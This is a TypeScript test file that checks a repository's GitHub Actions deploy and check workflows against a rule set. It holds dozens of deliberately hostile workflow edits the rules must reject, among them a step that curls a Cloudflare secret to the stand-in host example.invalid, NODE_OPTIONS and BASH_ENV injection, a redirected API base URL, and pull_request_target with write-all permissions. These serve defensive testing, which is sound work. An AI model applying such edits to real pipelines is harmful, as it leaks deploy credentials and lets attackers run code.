// The GitHub Actions workflows (.github/workflows/) against the rules in
// test/workflows.ts, and the files of the repository that the deploy job
// reads or that change what it installs.
//
// This guards against slips and plain changes; it does not replace reading
// each line of a change to the workflows (CONTRIBUTING.md, "部署會執行到的東西").
// test/workflows.ts lists what it does not see. Each altered copy below is
// a change the rules must turn away; all of them are.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { unstable_readConfig } from "wrangler";
import { WORKER_DIR } from "./build.ts";
import { BB_AMD64_LINUX_SHA256, CHECK_BB, INSTALL_PNPM, type Yaml, readYaml, workflowProblems } from "./workflows.ts";

const REPO = join(WORKER_DIR, "..");
const WORKFLOWS_DIR = join(REPO, ".github", "workflows");

function realFiles(): Record<string, string> {
  return Object.fromEntries(readdirSync(WORKFLOWS_DIR).map((f) => [f, readFileSync(join(WORKFLOWS_DIR, f), "utf8")]));
}

test("the workflows keep to the rules", () => {
  assert.deepEqual(workflowProblems(realFiles()), []);
});

const D = "deploy-test.yml";
const C = "checks.yml";
const SHA = "0123456789abcdef0123456789abcdef01234567";
const SECRET = "${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}";
const UPLOAD_ENV = `        env:\n          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}\n          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
const INSTALL_WRANGLER = "        run: pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile --registry=https://registry.npmjs.org/ --filter iamreal-worker\n";
const UPLOAD_RUN = "        run: WRANGLER_SEND_METRICS=false WRANGLER_HIDE_BANNER=true node_modules/.bin/wrangler deploy";
const DOWNLOAD = "      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n";
const BUILD_JOB = "  build:\n    runs-on: ubuntu-24.04\n";
const DEPLOY_JOB = "  deploy:\n    needs: build\n";
const GO_JOB = "  go:\n    runs-on: ubuntu-24.04\n";

type Change = (files: Record<string, string>) => void;
/** Replaces the first `from` in `file`; fails if it is not there, so a change never quietly does nothing. */
const replace =
  (file: string, from: string, to: string): Change =>
  (files) => {
    assert.ok(files[file]!.includes(from), `${file} has no ${JSON.stringify(from)}`);
    files[file] = files[file]!.replace(from, to);
  };
const addFile =
  (file: string, text: string): Change =>
  (files) => {
    files[file] = text;
  };

/** Changes the rules must turn away. 01 to 35 are the review's (#39); the rest are added here. */
const CHANGES: Record<string, Change[]> = {
  "01 a secret after ' #' inside a quoted run, in the build job": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n      - run: 'curl "https://example.invalid/ #${SECRET}"'\n`)],
  "02 a secret after ' #' in checks.yml": [replace(C, "      - run: go build ./...", `      - run: 'curl "https://example.invalid/ #${SECRET}"'\n      - run: go build ./...`)],
  "03 a step written with a bare '-' after the upload holds the token and runs something else": [
    replace(D, UPLOAD_ENV, ""),
    replace(D, UPLOAD_RUN, `${UPLOAD_ENV.replace(SECRET, "x")}${UPLOAD_RUN}`),
    (f) => {
      f[D] += `      -\n${UPLOAD_ENV}        run: node scripts/anything.js\n`;
    },
  ],
  "04 shell: in the last step": [replace(D, UPLOAD_RUN, `        shell: bash -c "node scripts/anything.js; bash {0}"\n${UPLOAD_RUN}`)],
  "05 defaults: at the top": [replace(D, "jobs:\n", 'defaults:\n  run:\n    shell: bash -c "node scripts/anything.js; bash {0}"\n\njobs:\n')],
  "06 the last step's working-directory changed": [replace(D, "        working-directory: worker\n        env:", "        working-directory: elsewhere\n        env:")],
  "07 more env in the last step (NODE_OPTIONS, CLOUDFLARE_API_BASE_URL)": [
    replace(D, UPLOAD_ENV, `${UPLOAD_ENV}          NODE_OPTIONS: --require ./scripts/anything.cjs\n          CLOUDFLARE_API_BASE_URL: https://example.invalid/client/v4\n`),
  ],
  "08 BASH_ENV at the top": [replace(D, "jobs:\n", "env:\n  BASH_ENV: scripts/anything.sh\n\njobs:\n")],
  "09 the last step's run continued on the next line": [(f) => void (f[D] = f[D]!.replace(/(--env-file=\/dev\/null\n)$/, "$1          ; node scripts/anything.js\n"))],
  "10 a quoted key \"uses\" with a tag": [replace(D, DOWNLOAD, '      - "uses": actions/download-artifact@v8\n')],
  "11 'uses :' with a space, a tag": [replace(D, DOWNLOAD, "      - uses : actions/download-artifact@v8\n")],
  "12 a flow mapping - { uses: x@tag }": [replace(D, DOWNLOAD, `      - { uses: some/action@main }\n${DOWNLOAD}`)],
  "13 a new workflow: escaped pull_request_target, write-all": [addFile("third.yml", 'name: third\non:\n  "pull_request\\x5ftarget":\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n')],
  "14 a new workflow: on issue_comment and workflow_dispatch, write-all": [addFile("third.yml", "name: third\non: [issue_comment, workflow_dispatch]\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "15 permissions: write-all in the deploy job": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    permissions: write-all\n`)],
  "16 a quoted \"permissions\" in a job of checks.yml": [replace(C, GO_JOB, '  go:\n    "permissions": write-all\n    runs-on: ubuntu-24.04\n')],
  "17 before the upload: npm ci": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: npm ci\n`)],
  "18 before the upload: bash scripts/x.sh": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: bash scripts/anything.sh\n`)],
  "19 before the upload: pnpm deploy:test": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: pnpm -C worker deploy:test\n`)],
  "20 --ignore-scripts=false": [replace(D, "--ignore-scripts --ignore-pnpmfile", "--ignore-scripts=false --ignore-pnpmfile")],
  "21 the install continued on the next line": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER.trimEnd()}\n          && node scripts/anything.js\n`)],
  "22 an action that runs a script, pinned to a commit": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - uses: actions/github-script@${SHA} # v9.0.0\n        with:\n          script: require("./scripts/anything.cjs")\n`)],
  "23 the deploy job checks out another ref": [replace(D, "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Install wrangler", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          ref: some-other-branch\n      - name: Install wrangler")],
  "24 the build job rewrites index.js before handing it on": [replace(D, "      - uses: actions/upload-artifact@", '      - run: node scripts/anything.js > "$RUNNER_TEMP/worker-build/index.js"\n      - uses: actions/upload-artifact@')],
  "25 the artifact of another run, with github.token": [replace(D, "          path: ${{ runner.temp }}/worker-build\n      # The build's", "          path: ${{ runner.temp }}/worker-build\n          run-id: 123\n          github-token: ${{ github.token }}\n      # The build's")],
  "26 an if: on the upload": [replace(D, "      - name: Upload to iamreal-test\n", "      - name: Upload to iamreal-test\n        if: github.actor == 'someone'\n")],
  "30 on: [pull_request] in checks.yml": [replace(C, "on:\n  pull_request:\n", "on: [pull_request]\n")],
  "31 run: | before the upload": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: |\n          echo hi\n`)],
  "32 a job that calls another workflow": [replace(D, DEPLOY_JOB, `  other:\n    uses: ./.github/workflows/x.yml\n${DEPLOY_JOB}`)],
  "33 secrets: inherit": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    secrets: inherit\n`)],
  "34 the secrets in the job's env, after the steps": [
    replace(D, UPLOAD_ENV, ""),
    (f) => {
      f[D] += `    env:\n      CLOUDFLARE_API_TOKEN: ${SECRET}\n      CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
    },
  ],
  "35 pull_request_target in a new file": [addFile("third.yml", "name: third\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "40 the install of wrangler runs a .pnpmfile.cjs": [replace(D, " --ignore-pnpmfile", "")],
  "41 pnpm installed after the checkout in the deploy job": [
    replace(D, "      - name: Install pnpm\n        run: npm install --global --ignore-scripts --registry=https://registry.npmjs.org/ pnpm@10.16.1\n      # wrangler.jsonc", "      # wrangler.jsonc"),
    replace(D, "      - name: Install wrangler\n", `      - name: Install pnpm\n        run: ${INSTALL_PNPM}\n      - name: Install wrangler\n`),
  ],
  "42 the upload loads .env files": [replace(D, " --env-file=/dev/null\n", "\n")],
  "43 the upload bundles again": [replace(D, " --no-bundle", "")],
  "44 the upload through a script of the repository": [replace(D, UPLOAD_RUN, "        run: node --experimental-strip-types scripts/deploy-test.ts #")],
  "45 another Node version in one job": [replace(C, "          node-version: 22.23.4", "          node-version: 22.23.5")],
  "46 another pnpm version in one job": [replace(C, "pnpm@10.16.1", "pnpm@10.16.2")],
  "47 pnpm from the registry .npmrc names": [replace(C, " --registry=https://registry.npmjs.org/ pnpm@", " pnpm@")],
  "48 a secret mentioned in a comment": [replace(C, "jobs:\n", `# \${{ secrets.X }}\njobs:\n`)],
  "49 a tab": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes:\t30\n")],
  "50 a document marker": [(f) => void (f[C] = `---\n${f[C]}`)],
  "51 an anchor and an alias": [replace(C, "      - run: go build ./...", "      - run: &x go build ./...\n      - run: *x")],
  "52 a merge key": [replace(C, GO_JOB, `${GO_JOB}    <<: {}\n`)],
  "53 a double-quoted value with an escape": [replace(C, "      - run: go build ./...", '      - run: "go build ./...\\x3b node x.js"')],
  "54 a local action": [replace(C, "      - run: go build ./...", "      - uses: ./.github/actions/x")],
  "55 a container action": [replace(C, "      - run: go build ./...", "      - uses: docker://alpine:3")],
  "56 an env in a step of checks.yml": [replace(C, "      - run: go build ./...", "      - run: go build ./...\n        env:\n          X: y")],
  "57 container: in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    container: some/image\n`)],
  "58 checks.yml also on push": [replace(C, "on:\n  pull_request:\n", "on:\n  pull_request:\n  push:\n")],
  "59 the deploy also on workflow_dispatch": [replace(D, "on:\n  push:\n", "on:\n  workflow_dispatch:\n  push:\n")],
  "60 checks.yml with write permissions": [replace(C, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "61 a job of checks.yml without the check of bb": [replace(C, '      - name: bb is the one of bb.js 6.0.0\n        run: echo "5bbb', '      - name: bb is the one of bb.js 6.0.0\n        run: echo "0bbb')],
  "62 checkout with a ref in checks.yml": [replace(C, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n")],
  "63 a key written twice": [replace(D, BUILD_JOB, `${BUILD_JOB}    runs-on: ubuntu-24.04\n`)],
  "64 a character outside ASCII": [replace(C, "      - run: go build ./...", "      - run: go build ./...\u2028      - run: node x.js")],
  "65 a key with a space before its colon": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes : 30\n")],
  "66 a step in the build job that a later step depends on, with a secret by another name": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n        env:\n          T: \${{ secrets.OTHER }}\n`)],
  "67 another directory in a step of checks.yml": [replace(C, "        working-directory: web\n        run: pnpm fetch-crs", "        working-directory: ..\n        run: pnpm fetch-crs")],
};

for (const [name, changes] of Object.entries(CHANGES)) {
  test(`turned away: ${name}`, () => {
    const files = realFiles();
    for (const change of changes) change(files);
    assert.notDeepEqual(workflowProblems(files), [], "the rules let this change through");
  });
}

test("the reader reads the part of YAML the workflows are written in, values as written", () => {
  const doc = readYaml(realFiles()[C]!) as Record<string, Yaml>;
  assert.deepEqual(doc.on, { pull_request: null });
  assert.deepEqual(Object.keys(doc.jobs as object), ["go", "typescript", "browser"]);
  const browser = (doc.jobs as Record<string, Record<string, Yaml>>).browser!;
  assert.deepEqual(browser.env, { CHROME: "/usr/bin/google-chrome" });
  assert.ok((browser.steps as Record<string, Yaml>[]).some((s) => s.run === '"$CHROME" --version'));
  assert.deepEqual(readYaml("a: 'it''s # not a comment' # a comment\nb:\n  - x\n  - y: z\n    w: v\n"), { a: "it's # not a comment", b: ["x", { y: "z", w: "v" }] });
});

test("every job of checks.yml uses the bb of bb.js 6.0.0: the SHA-256 it checks is that file's", () => {
  // The package is installed for worker/ too (its devDependency), with every platform's bb in it.
  const bb = join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "build", "amd64-linux", "bb");
  const pkg = JSON.parse(readFileSync(join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "package.json"), "utf8")) as { version: string };
  assert.equal(pkg.version, "6.0.0");
  assert.equal(createHash("sha256").update(readFileSync(bb)).digest("hex"), BB_AMD64_LINUX_SHA256);
  assert.ok(realFiles()[C]!.includes(`run: ${CHECK_BB}`));
  assert.ok(INSTALL_PNPM.includes("--registry=https://registry.npmjs.org/"));
});

test("deploying runs no command of the repository: the wrangler configuration has no build command", () => {
  // wrangler runs `build.command` before it uploads, with --no-bundle too: getEntry
  // (src/deployment-bundle/entry.ts in wrangler 4.160.1) calls runCustomBuild whatever the flag,
  // and Cloudflare's documentation says the command "will be run as part of `wrangler dev` and
  // `npx wrangler deploy`" (https://developers.cloudflare.com/workers/wrangler/custom-builds/).
  // A command there would run in the step that has the token.
  const config = unstable_readConfig({ config: join(WORKER_DIR, "wrangler.jsonc"), env: "test" });
  assert.equal(config.build.command, undefined);
});

test("no file in the repository changes what the deploy job installs or what wrangler loads", () => {
  // .npmrc: where pnpm and npm fetch from, and pnpm's settings. .pnpmfile.cjs: code pnpm runs
  // while installing (the deploy job passes --ignore-pnpmfile too). worker/.env*: wrangler loads
  // them unless --env-file names others (scripts/deploy.ts). patches/: pnpm's patches of packages.
  const tracked = execFileSync("git", ["-C", REPO, "ls-files", "-z"], { encoding: "utf8" }).split("\0").filter(Boolean);
  assert.ok(tracked.includes("pnpm-lock.yaml"), "the check read the tracked files");
  assert.deepEqual(
    tracked.filter((f) => /(^|\/)\.npmrc$|(^|\/)\.pnpmfile\.c?js$|(^|\/)\.pnpmfile\.mjs$|^worker\/(.*\/)?\.env[^/]*$|^patches\//.test(f)),
    [],
  );
});

test("pnpm-workspace.yaml and the lockfile hold no setting that changes the packages installed", () => {
  // patchedDependencies, overrides, packageExtensions, pnpmfile, configDependencies and the like
  // would change wrangler as the deploy job installs it; tried: a patch of wrangler in
  // pnpm-workspace.yaml and the lockfile is applied under --ignore-scripts --ignore-pnpmfile.
  const workspace = readYaml(readFileSync(join(REPO, "pnpm-workspace.yaml"), "utf8")) as Record<string, Yaml>;
  assert.deepEqual(Object.keys(workspace), ["packages", "minimumReleaseAge", "ignoredBuiltDependencies"]);
  const lockKeys = readFileSync(join(REPO, "pnpm-lock.yaml"), "utf8")
    .split("\n")
    .filter((l) => /^[^\s#]/.test(l))
    .map((l) => l.replace(/:.*$/, ""));
  assert.deepEqual(lockKeys, ["lockfileVersion", "settings", "importers", "packages", "snapshots"]);
});
